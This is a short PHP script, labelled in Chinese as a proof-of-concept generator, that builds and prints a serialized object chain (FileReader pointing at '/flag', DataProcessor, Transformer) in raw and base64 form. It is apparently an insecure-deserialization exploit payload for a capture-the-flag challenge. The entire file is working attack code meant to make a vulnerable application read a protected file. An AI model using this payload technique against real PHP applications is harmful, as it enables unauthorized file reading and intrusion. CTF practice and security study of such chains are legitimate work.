<?php
// POC生成脚本
class FileReader {
    public $filename = '/flag';
    public $content;
}

class DataProcessor {
    public $data;
    public $processor;
}

class Transformer {
    public $callback = 'strval';
    public $param;
}

$fr = new FileReader();
$t = new Transformer();
$dp = new DataProcessor();
$dp->data = $fr;
$dp->processor = $t;

$payload = serialize($dp);
echo "Serialized: " . $payload . "\n";
echo "Base64: " . base64_encode($payload) . "\n";
?>
